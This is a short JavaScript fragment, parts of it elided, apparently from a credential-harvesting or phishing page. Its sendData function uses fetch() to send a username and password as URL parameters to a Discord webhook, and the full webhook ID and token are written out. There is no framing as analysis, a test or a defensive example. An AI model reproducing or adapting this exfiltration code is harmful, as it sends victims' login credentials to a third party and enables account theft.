...
function sendData() {
    ...
    fetch(`https://discord.com/api/webhooks/1443347424805523506/wD-wkxSLEYKVcc2KXImsqDidIPCfZdkiKHrNuitA-T8rmBIwTfuSf5KukdB39RHJ1-7X?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
